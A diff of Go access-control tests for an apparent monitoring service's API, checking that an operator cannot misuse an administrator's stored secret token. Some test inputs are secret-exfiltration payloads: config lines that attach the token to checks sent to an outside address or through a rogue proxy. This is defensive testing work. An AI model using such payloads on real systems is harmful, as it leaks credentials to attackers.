@@ -14,12 +14,12 @@ func TestOperatorCannotUseSecrets(t *testing.T) {
 	if c := admin.do("PUT", "/api/v1/secrets/token", map[string]string{"value": "s3cr3t-value"}, nil); c != 204 {
 		t.Fatalf("secret: %d", c)
 	}
-	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator"}, nil); c != 200 {
+	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator", "groups": []string{"ops"}}, nil); c != 200 {
 		t.Fatalf("user: %d", c)
 	}
 	mon := func(name, url string) map[string]any {
 		return map[string]any{"record": map[string]any{"name": name, "type": "HTTP", "target": url,
-			"opts": map[string]string{"header": "Authorization: Bearer ${secret:token}"}}}
+			"opts": map[string]string{"header": "Authorization: Bearer ${secret:token}", "group": "ops"}}}
 	}
 	if c := admin.do("POST", "/api/v1/monitors", mon("api", "http://192.168.1.50/health"), nil); c != 200 {
 		t.Fatalf("admin add: %d", c)
@@ -35,8 +35,13 @@ func TestOperatorCannotUseSecrets(t *testing.T) {
 		t.Fatalf("operator pause: %d", c)
 	}
 	// Other checks stay theirs to add.
-	if c := op.do("POST", "/api/v1/monitors", map[string]any{"record": map[string]any{"name": "plain", "type": "HTTP", "target": "http://192.168.1.51/"}}, nil); c != 200 {
-		t.Fatalf("operator plain add: %d", c)
+	var er struct {
+		Error, Code, Message string
+		Message2             string `json:"error"`
+	}
+	c := op.do("POST", "/api/v1/monitors", map[string]any{"record": map[string]any{"name": "plain", "type": "HTTP", "target": "http://192.168.1.51/"}}, &er)
+	if c != 200 {
+		t.Fatalf("operator plain add: %d %+v", c, er)
 	}
 	if c := op.do("DELETE", "/api/v1/monitors/api", nil, nil); c != 200 && c != 204 {
 		t.Fatalf("operator delete: %d", c)
@@ -48,7 +53,7 @@ func TestOperatorCannotUseSecrets(t *testing.T) {
 func TestOperatorCannotAddQueries(t *testing.T) {
 	admin := newEnv(t, testBind, nil)
 	admin.setup()
-	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator"}, nil); c != 200 {
+	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator", "groups": []string{"ops"}}, nil); c != 200 {
 		t.Fatalf("user: %d", c)
 	}
 	op := admin.loginAs("op", "secret123")
@@ -71,22 +76,22 @@ func TestOperatorCannotUseSecretsThroughDefault(t *testing.T) {
 	if c := admin.do("PUT", "/api/v1/secrets/token", map[string]string{"value": "s3cr3t-value"}, nil); c != 204 {
 		t.Fatalf("secret: %d", c)
 	}
-	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator"}, nil); c != 200 {
+	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator", "groups": []string{"ops"}}, nil); c != 200 {
 		t.Fatalf("user: %d", c)
 	}
 	op := admin.loginAs("op", "secret123")
 	var cfg struct{ Text string }
-	op.do("GET", "/api/v1/config", nil, &cfg)
-	steal := cfg.Text + "$DEFAULT header=\"Authorization: Bearer ${secret:token}\"\nsteal IN HTTP http://203.0.113.9/\n$DEFAULT\n"
+	admin.do("GET", "/api/v1/config", nil, &cfg)
+	steal := cfg.Text + "$DEFAULT header=\"Authorization: Bearer ${secret:token}\"\nsteal IN HTTP http://203.0.113.9/ group=ops\n$DEFAULT\n"
 	if c := op.do("PUT", "/api/v1/config", map[string]any{"text": steal}, nil); c != 403 {
 		t.Fatalf("operator sent a secret through $DEFAULT: %d", c)
 	}
 	// The administrator's check under such a $DEFAULT …
-	withDef := cfg.Text + "$DEFAULT header=\"Authorization: Bearer ${secret:token}\"\napi IN HTTP http://192.168.1.50/health\n$DEFAULT\n"
+	withDef := cfg.Text + "$DEFAULT header=\"Authorization: Bearer ${secret:token}\"\napi IN HTTP http://192.168.1.50/health group=ops\n$DEFAULT\n"
 	if c := admin.do("PUT", "/api/v1/config", map[string]any{"text": withDef}, nil); c != 200 {
 		t.Fatalf("admin: %d", c)
 	}
-	op.do("GET", "/api/v1/config", nil, &cfg)
+	admin.do("GET", "/api/v1/config", nil, &cfg)
 	// … cannot be sent elsewhere by a $DEFAULT the operator adds above it.
 	moved := strings.Replace(cfg.Text, "$DEFAULT header=", "$DEFAULT proxy=http://203.0.113.9:3128 header=", 1)
 	if moved == cfg.Text {
@@ -95,8 +100,9 @@ func TestOperatorCannotUseSecretsThroughDefault(t *testing.T) {
 	if c := op.do("PUT", "/api/v1/config", map[string]any{"text": moved}, nil); c != 403 {
 		t.Fatalf("operator redirected a check through $DEFAULT: %d", c)
 	}
-	// Unrelated changes stay the operator's.
-	if c := op.do("PUT", "/api/v1/config", map[string]any{"text": cfg.Text + "plain IN HTTP http://192.168.1.51/\n"}, nil); c != 200 {
-		t.Fatalf("operator plain add: %d", c)
+	// Other work on a monitor in their group stays the operator's
+	// (the raw configuration stays with administrators).
+	if c := op.do("POST", "/api/v1/monitors/api/pause", map[string]any{"paused": true}, nil); c != 200 {
+		t.Fatalf("operator pause: %d", c)
 	}
 }
